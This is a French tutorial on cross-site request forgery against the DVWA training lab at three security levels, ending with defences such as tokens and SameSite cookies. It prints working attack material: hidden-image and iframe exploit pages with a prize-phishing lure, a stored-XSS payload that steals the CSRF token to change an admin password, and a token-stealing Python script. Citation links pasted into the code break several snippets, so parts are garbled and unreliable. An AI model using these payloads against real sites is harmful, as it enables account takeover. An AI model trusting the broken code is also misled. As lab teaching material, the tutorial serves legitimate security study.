# Cours : CSRF (Cross-Site Request Forgery) - Exploitation DVWA

## Introduction

Cette section couvre :
- **Architecture d'application** : Opportunités d'attaque
- **CSRF** : Définition et principes [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)
- **DVWA CSRF Low** : Exploitation via URL GET
- **DVWA CSRF Medium** : Bypass Referer header [braincoke](https://braincoke.fr/write-up/dvwa/dvwa-csrf/)
- **DVWA CSRF High** : Exploitation User Token via iframe [inventyourshit](https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/)
- **Protections** : Tokens, SameSite cookies [cheatsheetseries.owasp](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

***

## Partie 1 : Architecture d'application et CSRF

### 1.1 Définition de CSRF

**Cross-Site Request Forgery (CSRF)** : Attaque qui **force un utilisateur authentifié** à exécuter des actions non désirées sur une application web où il est déjà connecté. [imperva](https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/)

**Synonymes** :
- XSRF
- Sea Surf
- Session Riding
- One-Click Attack

**Principe**  : [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)
```
1. Victime connectée à site-banque.com
2. Victime visite site-malveillant.com (sans se déconnecter)
3. Site-malveillant.com envoie requête vers site-banque.com
4. Navigateur inclut automatiquement les cookies de session
5. Site-banque.com exécute l'action (pense que c'est la victime)
```

**Différence avec XSS** :

| Critère | CSRF | XSS |
|---------|------|-----|
| **Cible** | Serveur (action forcée) | Client (code exécuté) |
| **Exploit** | Requête forgée | JavaScript injecté |
| **Session** | Utilise session légitime | Vole session |
| **Impact** | Action non désirée | Vol de données |

### 1.2 Scénario classique CSRF

**Application bancaire vulnérable**  : [imperva](https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/)

**Requête légitime** :
```http
GET /transfer.do?acct=PersonB&amount=100 HTTP/1.1
Host: netbank.com
Cookie: sessionid=abc123
```

**Requête malveillante forgée** :
```http
GET /transfer.do?acct=AttackerA&amount=100 HTTP/1.1
Host: netbank.com
Cookie: sessionid=abc123  ← Envoyé automatiquement par le navigateur
```

**Vecteur d'attaque**  : [imperva](https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/)

**a) Lien HTML caché** :
```html
<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=100">
  Voir mes photos de vacances !
</a>
```

**b) Image invisible** :
```html
<img src="http://netbank.com/transfer.do?acct=AttackerA&amount=100" width="0" height="0">
```

**c) Formulaire auto-submit**  : [imperva](https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/)
```html
<body onload="document.forms[0].submit()">
  <form action="http://netbank.com/transfer.do" method="POST">
    <input type="hidden" name="acct" value="AttackerA"/>
    <input type="hidden" name="amount" value="100"/>
    <input type="submit" value="Voir mes photos !"/>
  </form>
</body>
```

**Résultat** : Si la victime clique/charge la page **pendant qu'elle est connectée** à netbank.com, le transfert s'exécute.

### 1.3 Conditions requises pour CSRF

**Pour qu'une attaque CSRF réussisse**  : [cloudflare](https://www.cloudflare.com/learning/security/threats/cross-site-request-forgery/)

1. ✅ **Action de valeur** : L'action cible doit avoir un impact (changement de mot de passe, transfert d'argent, modification de données)
2. ✅ **Authentification par cookie** : L'application utilise des cookies de session (envoyés automatiquement)
3. ✅ **Aucun paramètre imprévisible** : Tous les paramètres sont devinables par l'attaquant
4. ✅ **Utilisateur authentifié** : La victime doit être connectée au moment de l'attaque

***

## Partie 2 : DVWA CSRF - Low Security

### 2.1 Configuration

**Accès** :
```
1. DVWA → DVWA Security → Low
2. CSRF → Password change form
```

**Interface** :
```
┌─────────────────────────────────────┐
│  Change your admin password         │
│                                     │
│  New password:     [________]       │
│  Confirm password: [________]       │
│                    [Change]         │
└─────────────────────────────────────┘
```

### 2.2 Analyse du comportement

**Test légitime** :
```
1. New password: newpassword123
2. Confirm password: newpassword123
3. Change
```

**Observation de l'URL** :
```
http://servertcm:8001/vulnerabilities/csrf/?password_new=newpassword123&password_conf=newpassword123&Change=Change
```

**⚠️ Problème** : 
- **Méthode GET** : Paramètres visibles dans l'URL
- **Pas de token CSRF** : Aucune validation de l'origine de la requête
- **Credentials en clair** : Mot de passe visible dans l'URL/logs/historique

### 2.3 Exploitation - Méthode 1 : URL Replay

**Workflow** :

#### Étape 1 : Changer le mot de passe normalement
```
1. DVWA CSRF → Formulaire
2. New password: password1
3. Confirm password: password1
4. Change
```

**URL générée** :
```
http://servertcm:8001/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change
```

#### Étape 2 : Copier l'URL

**Copier l'URL complète** depuis la barre d'adresse.

#### Étape 3 : Fermer l'onglet (optionnel)

**Fermer l'onglet** sans se déconnecter (session reste active dans le navigateur).

#### Étape 4 : Ouvrir un nouvel onglet

**Dans le nouvel onglet**, coller l'URL **en modifiant les paramètres** :

**URL modifiée** :
```
http://servertcm:8001/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change
```

**Résultat** :
```
Password Changed.
```

**Succès** : Mot de passe changé en `hacked123` sans repasser par le formulaire ! ✅

### 2.4 Exploitation - Méthode 2 : Site malveillant

**Créer une page HTML malveillante** :

**fichier : `malicious.html`**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Vous avez gagné un iPhone !</title>
</head>
<body>
    <h1>Félicitations ! Cliquez ici pour réclamer votre prix</h1>
    
    <!-- Image invisible qui forge la requête CSRF -->
    <img src="http://servertcm:8001/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" 
         width="0" height="0" style="display:none">
    
    <p>Chargement...</p>
</body>
</html>
```

**Déploiement** :
```bash
# Héberger la page
python3 -m http.server 8080

# Envoyer le lien à la victime
http://192.168.1.48:8080/malicious.html
```

**Scénario d'attaque** :
```
1. Victime connectée à DVWA (session active)
2. Victime reçoit email : "Vous avez gagné un iPhone !"
3. Victime clique sur le lien malicious.html
4. Page se charge → <img> envoie requête CSRF
5. Navigateur inclut automatiquement les cookies DVWA
6. Mot de passe admin changé en "pwned"
```

**Résultat** : Takeover du compte admin sans que la victime ne s'en rende compte.

***

## Partie 3 : DVWA CSRF - Medium Security

### 3.1 Configuration

```
1. DVWA Security → Medium
2. CSRF
```

### 3.2 Test de l'attaque Low (échoue)

**Tentative** :
```
1. Changer le mot de passe normalement
2. Copier l'URL
3. Ouvrir nouvel onglet
4. Coller l'URL modifiée
```

**Résultat** :
```
That request didn't look correct.
```

**Échec** : L'attaque simple ne fonctionne plus ❌

### 3.3 Analyse du code source

**Voir le code** :
```
CSRF → View Source (bouton en bas)
```

**Code PHP (Medium)**  : [oreateai](https://www.oreateai.com/blog/indepth-analysis-of-csrf-attacks-in-dvwa/6ee1f6d8e81da5b6766ced10ea4e665e)
```php
<?php
// Get input
$pass_new  = $_GET['password_new'];
$pass_conf = $_GET['password_conf'];

// Check Referer header
if (stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false) {
    // Change password
    ...
    echo "Password Changed.";
} else {
    echo "That request didn't look correct.";
}
?>
```

**Protection** : Vérification du header `Referer`. [braincoke](https://braincoke.fr/write-up/dvwa/dvwa-csrf/)

**Logique** :
- Requête acceptée **seulement si** `Referer` contient le nom du serveur
- Exemple : `Referer: http://servertcm:8001/vulnerabilities/csrf/`

### 3.4 Analyse avec ZAP Proxy

**Capturer les deux requêtes** :

#### Requête 1 : Depuis la page DVWA (légitime)

```http
GET /vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change HTTP/1.1
Host: servertcm:8001
Cookie: PHPSESSID=abc123; security=medium
Referer: http://servertcm:8001/vulnerabilities/csrf/  ← Présent
User-Agent: Mozilla/5.0
```

**Réponse** :
```http
HTTP/1.1 200 OK
Content-Type: text/html

Password Changed.
```

#### Requête 2 : Depuis un nouvel onglet (URL replay)

```http
GET /vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change HTTP/1.1
Host: servertcm:8001
Cookie: PHPSESSID=abc123; security=medium
[AUCUN Referer]  ← Manquant !
User-Agent: Mozilla/5.0
```

**Réponse** :
```http
HTTP/1.1 200 OK
Content-Type: text/html

That request didn't look correct.
```

**Différence clé** : Le header `Referer` est absent dans la requête 2. [braincoke](https://braincoke.fr/write-up/dvwa/dvwa-csrf/)

### 3.5 Bypass : Injection de Referer avec ZAP

**Workflow**  : [braincoke](https://braincoke.fr/write-up/dvwa/dvwa-csrf/)

#### Étape 1 : Activer les breakpoints ZAP

```
1. ZAP → Barre d'outils → Bouton "Set break on all requests/responses" (orbe vert)
2. Bouton devient rouge (breakpoints activés)
```

#### Étape 2 : Déclencher la requête

```
1. Nouvel onglet
2. Coller l'URL :
   http://servertcm:8001/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
3. Entrée
```

**ZAP intercepte la requête** (breakpoint).

#### Étape 3 : Modifier la requête

**Dans ZAP, onglet "Break"** :

**Requête interceptée** :
```http
GET /vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change HTTP/1.1
Host: servertcm:8001
Cookie: PHPSESSID=abc123; security=medium
User-Agent: Mozilla/5.0
```

**Ajouter le header Referer** :
```http
GET /vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change HTTP/1.1
Host: servertcm:8001
Cookie: PHPSESSID=abc123; security=medium
Referer: http://servertcm:8001/vulnerabilities/csrf/  ← Ajouté manuellement
User-Agent: Mozilla/5.0
```

#### Étape 4 : Forward la requête

```
1. ZAP → Bouton "Continue to next breakpoint" (flèche verte)
2. Requête envoyée au serveur
```

**Réponse** :
```http
HTTP/1.1 200 OK

Password Changed.
```

**Succès** : Bypass de la protection Referer ! ✅

### 3.6 Bypass automatique : Page malveillante avec Referer

**Créer `exploit-medium.html`**  : [inventyourshit](https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/)

```html
<!DOCTYPE html>
<html>
<head>
    <title>Bypass CSRF Medium</title>
    <!-- Forcer le navigateur à envoyer le Referer -->
    <meta name="referrer" content="unsafe-url">
</head>
<body>
    <h1>Chargement...</h1>
    
    <!-- Iframe pour charger la page CSRF -->
    <iframe src="http://servertcm:8001/vulnerabilities/csrf/?password_new=owned&password_conf=owned&Change=Change" 
            width="0" height="0" style="display:none"></iframe>
</body>
</html>
```

**Hébergement** :
```bash
# Héberger sur un domaine contenant le nom du serveur (si possible)
# OU utiliser un fichier nommé avec l'hostname
mv exploit-medium.html servertcm:8001.html

python3 -m http.server 8080
```

**Exploitation** :
```
1. Victime connectée à DVWA
2. Victime visite : http://attacker.com:8080/servertcm:8001.html
3. Referer envoyé : http://attacker.com:8080/servertcm:8001.html
4. Contient "servertcm:8001" → Bypass réussi !
```

***

## Partie 4 : DVWA CSRF - High Security

### 4.1 Configuration

```
1. DVWA Security → High
2. CSRF
```

### 4.2 Analyse de la protection

**Formulaire** :
```
http://servertcm:8001/vulnerabilities/csrf/?user_token=a3f7c9e2b1d4f8a6
```

**Observation** : Un **token aléatoire** (`user_token`) est ajouté à l'URL. [portswigger](https://portswigger.net/web-security/csrf/preventing)

**Test** :
```
1. Recharger la page → Token change
2. Ancienne URL avec ancien token → Refusée
```

**Protection** : CSRF Token. [blackduck](https://www.blackduck.com/glossary/what-is-csrf.html)

### 4.3 Code source

**Code PHP (High)**  : [portswigger](https://portswigger.net/web-security/csrf/preventing)
```php
<?php
// Generate CSRF token
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = md5(uniqid(rand(), true));
}

// Get input
$pass_new  = $_GET['password_new'];
$pass_conf = $_GET['password_conf'];
$token     = $_GET['user_token'];

// Validate token
if ($token === $_SESSION['csrf_token']) {
    // Change password
    echo "Password Changed.";
} else {
    echo "That request didn't look correct.";
}
?>
```

**Principe**  : [portswigger](https://portswigger.net/web-security/csrf/preventing)
- Token généré aléatoirement
- Stocké dans la session serveur
- Doit être inclus dans chaque requête
- Validé côté serveur

### 4.4 Exploitation : Vol du token via iframe + XSS

**Stratégie**  : [reddit](https://www.reddit.com/r/hacking/comments/1db2f65/what_is_stopping_an_attacker_from_reading_csrf/)
```
1. Charger la page CSRF DVWA dans un iframe
2. Utiliser JavaScript pour lire le token depuis l'iframe
3. Construire l'URL CSRF avec le token volé
4. Soumettre la requête
```

**⚠️ Prérequis** : Vulnérabilité XSS présente sur le site (pour exécuter JavaScript).

#### Étape 1 : Créer index.html avec iframe

**Fichier : `exploit-high.html`**  : [inventyourshit](https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/)

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF High Exploit</title>
</head>
<body>
    <h1>Exploitation CSRF High Security</h1>
    
    <!-- Iframe chargeant la page CSRF DVWA -->
    <iframe id="csrfFrame" 
            src="http://servertcm:8001/vulnerabilities/csrf/" 
            width="100%" 
            height="400"></iframe>
    
    <button onclick="exploitCSRF()">Changer le mot de passe</button>
    
    <script src="exploit.js"></script>
</body>
</html>
```

#### Étape 2 : Script JavaScript pour voler le token

**Fichier : `exploit.js`**  : [inventyourshit](https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/)

```javascript
function exploitCSRF() {
    // Accéder à l'iframe
    var iframe = document.getElementById('csrfFrame');
    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
    
    // Extraire le token de l'URL de l'iframe
    var iframeSrc = iframe.contentWindow.location.href;
    var tokenMatch = iframeSrc.match(/user_token=([a-f0-9]+)/);
    
    if (!tokenMatch) {
        console.error("Token not found in iframe URL");
        return;
    }
    
    var token = tokenMatch [owasp](https://owasp.org/www-community/attacks/csrf);
    console.log("Stolen token: " + token);
    
    // Construire l'URL CSRF avec le token volé
    var csrfUrl = "http://servertcm:8001/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change&user_token=" + token;
    
    // Soumettre la requête CSRF
    window.location.href = csrfUrl;
}
```

**⚠️ Problème** : **Same-Origin Policy** bloque l'accès au contenu de l'iframe si les domaines diffèrent. [stackoverflow](https://stackoverflow.com/questions/2137505/how-to-prevent-csrf-xsrf-attacks-involving-embedded-iframes)

**Solution** : Exploit doit être hébergé sur le **même domaine** que DVWA (nécessite XSS).

#### Étape 3 : Exploitation via XSS stored

**Scénario**  : [inventyourshit](https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/)
```
1. Trouver une vulnérabilité XSS Stored sur DVWA
2. Injecter un payload qui vole le token CSRF
3. Forger la requête avec le token
```

**Payload XSS (dans un commentaire par exemple)** :

```html
<script>
// Récupérer le token de la page actuelle
var token = document.querySelector('input[name="user_token"]').value;

// Construire l'URL CSRF
var csrfUrl = '/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=' + token;

// Envoyer la requête avec une image invisible
var img = new Image();
img.src = csrfUrl;
</script>
```

**Workflow** :
```
1. Attaquant poste un commentaire avec le payload XSS
2. Victime (admin) visite la page de commentaires
3. JavaScript s'exécute dans le contexte de DVWA
4. Token extrait et requête CSRF envoyée
5. Mot de passe admin changé
```

#### Étape 4 : Script Python automatisé (alternative)

**Fichier : `csrf_high_exploit.py`**  : [inventyourshit](https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/)

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

# Configuration
TARGET = "http://servertcm:8001/vulnerabilities/csrf/"
SESSION_COOKIE = "PHPSESSID=abc123; security=high"

# Requête pour récupérer le token
response = requests.get(TARGET, cookies={"Cookie": SESSION_COOKIE})
soup = BeautifulSoup(response.text, 'html.parser')

# Extraire le token depuis l'URL ou un input hidden
token = None
for link in soup.find_all('a'):
    href = link.get('href')
    if 'user_token=' in href:
        token = href.split('user_token=') [owasp](https://owasp.org/www-community/attacks/csrf).split('&')[0]
        break

if not token:
    print("Token not found!")
    exit(1)

print(f"[+] Stolen token: {token}")

# Forger la requête CSRF
csrf_url = f"{TARGET}?password_new=hacked&password_conf=hacked&Change=Change&user_token={token}"
response = requests.get(csrf_url, cookies={"Cookie": SESSION_COOKIE})

if "Password Changed" in response.text:
    print("[+] CSRF successful! Password changed.")
else:
    print("[-] CSRF failed.")
```

**Exécution** :
```bash
python3 csrf_high_exploit.py
# [+] Stolen token: a3f7c9e2b1d4f8a6
# [+] CSRF successful! Password changed.
```

***

## Partie 5 : Protections contre CSRF

### 5.1 CSRF Tokens (recommandé) [cheatsheetseries.owasp](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

**Implémentation**  : [blackduck](https://www.blackduck.com/glossary/what-is-csrf.html)

**Génération côté serveur** :
```php
<?php
session_start();

// Générer un token unique
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>
```

**Inclusion dans le formulaire**  : [portswigger](https://portswigger.net/web-security/csrf/preventing)
```html
<form method="POST" action="/change-password">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="password" name="new_password">
    <button type="submit">Change Password</button>
</form>
```

**Validation côté serveur**  : [portswigger](https://portswigger.net/web-security/csrf/preventing)
```php
<?php
session_start();

if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF token validation failed!");
}

// Traiter le changement de mot de passe
?>
```

**Caractéristiques d'un bon token**  : [portswigger](https://portswigger.net/web-security/csrf/preventing)
- ✅ **Imprévisible** : Haute entropie (CSPRNG)
- ✅ **Lié à la session** : Unique par utilisateur
- ✅ **Strictement validé** : Vérifié à chaque requête
- ✅ **Transmis de manière sécurisée** : Hidden field, header, pas dans URL

### 5.2 SameSite Cookie Attribute [portswigger](https://portswigger.net/web-security/csrf/preventing)

**Configuration** :
```php
setcookie("sessionid", $value, [
    'samesite' => 'Strict',  // ou 'Lax'
    'secure' => true,
    'httponly' => true
]);
```

**Valeurs**  : [portswigger](https://portswigger.net/web-security/csrf/preventing)

| Valeur | Comportement |
|--------|--------------|
| `Strict` | Cookie **jamais** envoyé depuis un site tiers |
| `Lax` | Cookie envoyé seulement pour navigation (GET, pas POST) |
| `None` | Cookie toujours envoyé (nécessite `Secure`) |

**Impact** : Bloque CSRF automatiquement si configuré en `Strict`.

### 5.3 Vérification du Referer (faible)

**Problème**  : [oreateai](https://www.oreateai.com/blog/indepth-analysis-of-csrf-attacks-in-dvwa/6ee1f6d8e81da5b6766ced10ea4e665e)
- Referer peut être absent (privacy settings)
- Peut être forgé dans certains cas
- Validation souvent trop permissive (contains au lieu de equals)

**Utilisation** : Défense en profondeur seulement, pas protection principale.

### 5.4 Authentification à deux facteurs

**Principe** : Demander confirmation pour actions critiques.

**Exemple** :
```
1. Utilisateur soumet "Changement de mot de passe"
2. Serveur envoie email/SMS avec code
3. Utilisateur doit saisir le code pour confirmer
4. Même si CSRF réussit, l'action nécessite 2FA
```

### 5.5 Méthodes POST obligatoires

**Principe** : Refuser les requêtes GET pour actions sensibles.

**Mauvais** :
```
GET /delete-account?confirm=yes
```

**Bon** :
```
POST /delete-account
Body: confirm=yes&csrf_token=...
```

**Avantage** : Plus difficile d'exploiter via `<img>` ou lien simple.

***

## Résumé : Points clés à retenir

1. **CSRF** : Force un utilisateur authentifié à exécuter une action non désirée [owasp](https://owasp.org/www-community/attacks/csrf)
2. **Condition** : Session active + Action automatique + Pas de validation origine [cloudflare](https://www.cloudflare.com/learning/security/threats/cross-site-request-forgery/)
3. **DVWA Low** : GET avec paramètres dans URL, pas de protection
4. **Exploit Low** : URL replay, <img> invisible, formulaire auto-submit [imperva](https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/)
5. **DVWA Medium** : Vérification Referer header [oreateai](https://www.oreateai.com/blog/indepth-analysis-of-csrf-attacks-in-dvwa/6ee1f6d8e81da5b6766ced10ea4e665e)
6. **Bypass Medium** : ZAP breakpoint + injection Referer, ou filename avec hostname [braincoke](https://braincoke.fr/write-up/dvwa/dvwa-csrf/)
7. **DVWA High** : CSRF token aléatoire dans URL [inventyourshit](https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/)
8. **Exploit High** : Vol de token via iframe + XSS, ou script Python automatisé [inventyourshit](https://inventyourshit.com/dvwa-cross-site-request-forgery-low-med-high/)
9. **Same-Origin Policy** : Bloque accès iframe cross-domain [stackoverflow](https://stackoverflow.com/questions/2137505/how-to-prevent-csrf-xsrf-attacks-involving-embedded-iframes)
10. **Protection** : CSRF tokens imprévisibles + SameSite cookies [cheatsheetseries.owasp](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
11. **Token caractéristiques** : Imprévisible, lié session, validé strictement [blackduck](https://www.blackduck.com/glossary/what-is-csrf.html)
12. **SameSite=Strict** : Bloque automatiquement CSRF [portswigger](https://portswigger.net/web-security/csrf/preventing)
13. **Referer check** : Faible, peut être bypassé [oreateai](https://www.oreateai.com/blog/indepth-analysis-of-csrf-attacks-in-dvwa/6ee1f6d8e81da5b6766ced10ea4e665e)
14. **POST obligatoire** : Empêche exploits simples (img, link)
15. **2FA** : Défense en profondeur pour actions critiques
